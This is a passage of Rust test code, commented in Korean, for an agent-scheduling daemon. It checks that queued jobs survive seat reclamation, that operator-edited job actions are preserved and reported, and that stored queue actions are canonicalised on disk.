            "id": "operator-opt-in", "action": "push", "to": "cso",
            "text": "x", "every_minutes": 60, "via_queue": true
        }))
        .expect("추가-전용 스키마");
        assert!(job.uses_queue(), "전제: 신 데몬은 이 표현을 큐 경유로 읽는다");
        assert_eq!(
            job.action, ACTION_PUSH_QUEUED,
            "큐 경유가 계약인 잡이 구 데몬이 **수용**하는 action 으로 저장돼 있다(강등 시 직접 주입)"
        );
    }

    /// [codex #9 blocking] fresh 좌석 회수가 큐에 적재된 일감을 파괴한다.
    ///
    /// `fire_push`(schedule.rs:1043-1050)는 `deliver_push` 가 `"queued"`(=적재 성공, 배달 아님)
    /// 를 돌려줘도 `effective_close_ttl` 로 회수 타이머를 **무조건** 건다. `close_after_secs:0`
    /// 은 `Some(0)` 이라(:897-900) 배달 게이트가 열리기 전에 `close_surface` 가 돌고,
    /// 그 경로는 활성 큐를 폐기한다(governance.rs:4277 `drain_active_except_inflight`).
    #[test]
    fn triage_x9_queued_fresh_job_does_not_arm_an_immediate_reclamation() {
        let job: Job = serde_json::from_value(json!({
            "id": "fresh-queued", "action": ACTION_PUSH_QUEUED, "to": "w", "text": "x",
            "at": 1_700_000_000i64, "fresh": true, "close_after_secs": 0,
            "launch": {"role": "w", "agent": "claude"}
        }))
        .expect("스키마");
        assert!(job.uses_queue() && job.fresh, "전제: 큐 경유 + fresh");
        assert_ne!(
            effective_close_ttl(&job),
            Some(0),
            "큐 경유 배달은 준비 게이트를 기다리는데 회수는 즉시다 — 적재된 일감이 배달 전에 폐기된다"
        );
    }

    /// ★(성찰 A4 · blocking) **보류 중인 fresh 작업을 좌석과 함께 회수하지 않는다.**
    ///
    /// 실행 반례(종전): `push_queued + fresh:true + close_after_secs:0`(→ 하한 60초) 적재 후
    /// 승인 대기 1,800초가 지나면 활성 큐에 항목이 남아도 `close_surface(…, Reap)` 이 조건 없이
    /// 돌아 그 항목이 `queue.dropped` 로 폐기됐다 — 잡의 일감은 끝내 실행되지 않는데 그 사실은
    /// 이미 `schedule.fired{detail:"queued"}`(성공)로 보고된 뒤다.
    ///
    /// 전체 경로(60초 TTL + 1,800초 유예 = **1,860초**)를 1000배 압축 시계로 그대로 돈다
    /// ([`ReapTiming::compressed`] — 경계 건수·순서는 프로덕션과 동일하다). 상수 자체의 값과
    /// **분리**는 `fresh_reap_constants_separate_leak_period_from_delivery_grace` 가 핀한다.
    #[tokio::test]
    async fn triage_a4_a_pending_queue_item_defers_the_fresh_seat_reap() {
        let daemon = test_daemon();
        let s = daemon
            .create_surface(None, Some("sleep 30".into()), None, Some("w-fresh-1".into()), 24, 80)
            .expect("좌석 생성");
        daemon.roles.lock().unwrap().insert("w-fresh-1".into(), s.id);
        daemon.surfaces.lock().unwrap().insert(s.id, s.clone());
        *s.agent_meta.lock().unwrap() = Some(("claude".into(), "/usr/local/bin/claude".into()));
        // 적재(승인 대기) — 배달자가 게이트를 통과시키기 전까지 이 항목은 활성 큐에 남는다.
        let job: Job = serde_json::from_value(json!({
            "id": "fresh-queued", "action": ACTION_PUSH_QUEUED, "to": "w", "text": "x",
            "fresh": true, "close_after_secs": 0, "launch": {"role": "w", "agent": "claude"}
        }))
        .expect("스키마");
        assert_eq!(effective_close_ttl(&job), Some(QUEUED_CLOSE_MIN_TTL_SECS), "전제: 하한 60초");
        assert_eq!(
            deliver_push(&daemon, &job, s.id, "[schedule fresh-queued] 본문", None),
            Ok("queued")
        );
        let depth = || s.pending_queue.lock().unwrap().len();
        assert_eq!(depth(), 1, "전제 불성립 — 적재되지 않았다");

        let mut rx = daemon.bus.subscribe();
        let d = Arc::clone(&daemon);
        let sid = s.id;
        let handle = tokio::spawn(async move {
            reap_fresh_seat(d, sid, "fresh-queued".into(), ReapTiming::compressed(QUEUED_CLOSE_MIN_TTL_SECS), true).await;
        });

        // 유예 경계(60 + 1,800)에서 **전용 안내 이벤트 1건**이 나온다.
        let notice = tokio::time::timeout(Duration::from_secs(30), async {
            loop {
                let e = rx.recv().await.expect("버스");
                if e["name"] == "schedule.fresh_reap_deferred" {
                    return e;
                }
                assert_ne!(e["name"], "queue.dropped", "보류 중인 일감이 폐기됐다");
            }
        })
        .await
        .expect("유예 경계에서 안내 이벤트가 오지 않았다(조용히 회수했거나 영영 기다린다)");
        assert_eq!(notice["payload"]["job"], json!("fresh-queued"));
        assert_eq!(notice["payload"]["waited_ms"], json!(QUEUED_DELIVERY_GRACE_SECS),
            "안내가 유예 경계가 아닌 곳에서 났다");
        assert_eq!(notice["payload"]["grace_secs"], json!(QUEUED_DELIVERY_GRACE_SECS));
        // ★그 순간의 사실(이 스레드는 await 하지 않았으므로 회수 태스크는 진행하지 않는다):
        //   좌석 보존 · 항목 보존 · 주입 0.
        assert!(daemon.get_surface(sid).is_some(), "미완료 항목이 있는데 좌석을 닫았다");
        assert_eq!(depth(), 1, "미완료 항목이 큐에서 사라졌다(주입 또는 폐기)");

        // 처분이 정해지면(배달·만료) 그때 회수된다 — 무한 보류가 아니다.
        s.pending_queue.lock().unwrap().clear();
        tokio::time::timeout(Duration::from_secs(30), handle)
            .await
            .expect("처분이 정해졌는데 회수가 끝나지 않았다")
            .expect("회수 태스크 패닉");
        assert!(
            daemon.get_surface(sid).is_none_or(|x| x.exited.load(Ordering::Relaxed)),
            "처분이 정해졌는데 좌석이 회수되지 않았다(누수)"
        );
    }

    /// ★(성찰 A4) '누수 방지 주기' 와 '배달 유예' 는 **다른 상수**다 — 한 숫자로 묶여 있어서
    /// 반복 fresh 잡의 기본 TTL 을 바꾸면 배달 유예가 함께 움직였다.
    #[test]
    fn fresh_reap_constants_separate_leak_period_from_delivery_grace() {
        assert_eq!(FRESH_RECURRING_DEFAULT_TTL_SECS, 1800, "누수 방지 주기");
        assert_eq!(QUEUED_DELIVERY_GRACE_SECS, 1800, "배달 유예 안내 경계");
        assert_eq!(QUEUED_CLOSE_MIN_TTL_SECS, 60, "큐 경유 회수 하한");
        // 실행 반례의 전체 경로: 60초 TTL + 1,800초 유예 = 1,860초.
        assert_eq!(QUEUED_CLOSE_MIN_TTL_SECS + QUEUED_DELIVERY_GRACE_SECS, 1_860);
        let src = include_str!("schedule.rs");
        // ★needle 을 쪼개 조립한다 — `include_str!` 은 **이 검체 자신**도 읽으므로 통짜
        //   리터럴을 쓰면 검체가 자기 문자열에 걸려 언제나 실패한다(자기참조 함정).
        let fused = format!("{}{}", "QUEUED_CLOSE_MAX_WAIT_SECS: u64 = ", "FRESH_RECURRING_DEFAULT_TTL_SECS");
        assert!(!src.contains(&fused), "두 성질이 다시 한 상수로 묶였다");
        // 회수는 **조건부**다: 미완료 항목이 있으면 닫지 않는다.
        let body = src
            .split("async fn reap_fresh_seat(")
            .nth(1)
            .expect("회수 함수 소실");
        let body = &body[..body.find("\n}\n").expect("함수 끝")];
        assert!(
            body.contains("while d.get_surface(sid).is_some() && surface_queue_pending(&d, sid)"),
            "회수 대기가 '좌석 소멸'과 '처분 확정'을 다시 한 술어로 접었다"
        );
        assert!(
            !body.contains("waited < QUEUED"),
            "시간 상한이 다시 회수 조건이 됐다(미완료 항목이 좌석과 함께 폐기된다)"
        );
    }

    /// [codex #13 major] 표적 마이그레이션이 운영자의 **임의** action 편집을 덮어쓴다.
    ///
    /// 조건이 "구 표현(`push`)인가" 가 아니라 "코드 정의와 다른가" 다(schedule.rs:341-342).
    /// 같은 id·같은 마커를 유지한 채 action 을 `command` 로 바꾼 운영자 잡은 다음 부트에서
    /// `push_queued` 로 바뀌어 설정한 명령이 돌지 않고 그 문자열이 inbox 잡이 된다.
    #[test]
    fn triage_x13_migration_preserves_an_operator_non_push_action() {
        let mut jobs = vec![json!({
            "id": "cso-alert-inbox-check-60m",
            "every_minutes": 60,
            "action": "command",
            "command": "cys status --json > /tmp/cso-inbox.json",
            "_builtin": "alert",
            "_builtin_version": BUILTIN_JOBS_VERSION
        })];
        let (_changed, _conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert_eq!(
            jobs[0]["action"].as_str(),
            Some("command"),
            "운영자가 바꾼 action 이 무언 소실됐다(§B-5 수기 편집 보존 위반)"
        );
    }
}

// ═════════════════ 수렴(R3-WP3B) — 고침이 세운 불변식의 회귀 핀 ═════════════════
#[cfg(test)]
mod converge_schedule {
    use super::*;
    use serde_json::json;

    /// ★X8: 저장된 표현도 정규형으로 접힌다 — **그리고 `push` 이외의 action 은 건드리지 않는다**
    /// (그것을 건드리는 것이 X13 과 같은 부류의 운영자 편집 소실이다).
    #[test]
    fn converge_stored_queue_action_is_canonicalized_but_only_from_push() {
        let mut jobs = vec![
            json!({"id": "a", "action": "push", "to": "cso", "text": "x", "via_queue": true}),
            json!({"id": "b", "action": "command", "command": "true", "via_queue": true}),
            json!({"id": "c", "action": "push", "to": "master", "text": "x"}),
        ];
        assert!(canonicalize_stored_queue_actions(&mut jobs), "구 표현이 그대로 남았다");
        assert_eq!(jobs[0]["action"].as_str(), Some(ACTION_PUSH_QUEUED));
        assert_eq!(jobs[1]["action"].as_str(), Some("command"), "다른 action 을 큐 표현으로 덮었다");
        assert_eq!(jobs[2]["action"].as_str(), Some("push"), "큐 경유가 아닌 잡을 바꿨다");
        // 멱등.
        assert!(!canonicalize_stored_queue_actions(&mut jobs), "재실행이 또 바꾼다(비멱등)");
    }

    /// ★X9: 큐 경유 잡의 회수 하한 — 직접 주입 잡의 `0` 은 **그대로**다(무회귀).
    #[test]
    fn converge_close_ttl_floor_applies_only_to_queue_backed_jobs() {
        let mk = |v: serde_json::Value| -> Job { serde_json::from_value(v).expect("스키마") };
        let direct = mk(json!({"id": "d", "action": "push", "to": "w", "text": "x",
                               "at": 1_700_000_000i64, "fresh": true, "close_after_secs": 0}));
        assert_eq!(effective_close_ttl(&direct), Some(0), "직접 주입 잡의 운영자 0 이 바뀌었다");
        let queued = mk(json!({"id": "q", "action": ACTION_PUSH_QUEUED, "to": "w", "text": "x",
                               "at": 1_700_000_000i64, "fresh": true, "close_after_secs": 0}));
        assert_eq!(effective_close_ttl(&queued), Some(QUEUED_CLOSE_MIN_TTL_SECS));
        // 하한보다 큰 명시값은 존중한다(하한은 바닥이지 덮개가 아니다).
        let long = mk(json!({"id": "l", "action": ACTION_PUSH_QUEUED, "to": "w", "text": "x",
                             "at": 1_700_000_000i64, "fresh": true, "close_after_secs": 9_000}));
        assert_eq!(effective_close_ttl(&long), Some(9_000));
    }

    /// ★X13: 운영자가 바꾼 action 은 덮지 않고 **conflict 로 보고**한다(무음 소실 금지).
    #[test]
    fn converge_edited_builtin_action_is_reported_not_overwritten() {
        let mut jobs = vec![json!({
            "id": "cso-alert-inbox-check-60m", "every_minutes": 60, "action": "command",
            "command": "true", "_builtin": "alert", "_builtin_version": BUILTIN_JOBS_VERSION
        })];
        let (_changed, preempted, edited) = apply_builtin_jobs(&mut jobs);
        assert_eq!(jobs[0]["action"].as_str(), Some("command"), "운영자 편집이 덮였다");
        assert_eq!(
            edited,
            vec![("cso-alert-inbox-check-60m".to_string(), "command".to_string())],
            "덮지 않은 사실을 알리지 않았다(조용한 무접촉은 관측 소실이다)"
        );
        // ★(수렴 R2 · X13) 그 사실이 **예약 id 선점**으로 보고되면 운영자는 틀린 처방을 읽는다.
        assert!(
            preempted.is_empty(),
            "id 선점은 일어나지 않았는데 선점 목록에 넣었다(다른 id 로 옮기라는 틀린 안내가 나간다)"
        );
    }

    /// ★X8 잔여(major): **핫리로드도 파일을 접는다** — 메모리만 접으면 디스크는 강등 취약형이다.
    ///
    /// 신 데몬이 도는 동안 운영자가 손으로 `action:"push" + via_queue:true` 를 넣으면, 종전에는
    /// `load_jobs` 의 serde 계층이 **메모리의 Job 만** 정규화했다. 파일은 그대로 남아 강등된 구
    /// 데몬이 그것을 `push` 로 읽고 큐 준비 게이트를 우회해 직접 주입한다.
    #[test]
    fn converge_x8_hot_reload_folds_the_stored_representation_too() {
        let dir = std::env::temp_dir().join(format!(
            "cys-converge-x8-{}-{}",
            std::process::id(),
            now_epoch() as u64
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("schedule.json");
        let raw = json!({"jobs": [
            {"id": "q", "action": "push", "via_queue": true, "to": "cso", "text": "x",
             "every_minutes": 60},
            {"id": "c", "action": "command", "command": "true", "every_minutes": 5}
        ]});
        std::fs::write(&path, raw.to_string()).unwrap();
        let mut root: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert!(canonicalize_schedule_file(&path, &mut root), "구 표현을 접지 않았다");
        let on_disk: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(
            on_disk["jobs"][0]["action"].as_str(),
            Some(ACTION_PUSH_QUEUED),
            "파일이 여전히 구 표현이다 — 강등된 구 데몬이 직접 주입한다"
        );
        assert_eq!(on_disk["jobs"][0]["via_queue"].as_bool(), Some(true), "뜻이 바뀌었다");
        assert_eq!(on_disk["jobs"][1]["action"].as_str(), Some("command"), "다른 action 을 만졌다");
        // 멱등 — 바꿀 것이 없으면 파일을 건드리지 않는다(매 틱 쓰기 금지).
        let mut again: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert!(!canonicalize_schedule_file(&path, &mut again), "재실행이 또 쓴다(비멱등)");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// ★X8 잔여: 원샷 잡 제거가 **강등 취약형을 다시 영속하지 않는다**.
    #[test]
    fn converge_x8_one_shot_removal_does_not_repersist_the_unsafe_action() {
        let mut root = json!({"jobs": [
            {"id": "once", "action": "command", "command": "true", "at": 1},
            {"id": "q", "action": "push", "via_queue": true, "to": "cso", "text": "x"}
        ]});
        drop_job_and_canonicalize(&mut root, "once");
        assert_eq!(root["jobs"].as_array().map(|a| a.len()), Some(1), "원샷 잡이 남았다");
        assert_eq!(
            root["jobs"][0]["action"].as_str(),
            Some(ACTION_PUSH_QUEUED),
            "원시 JSON 을 되쓰는 경로가 구 표현을 디스크에 다시 심었다"
        );
    }
}
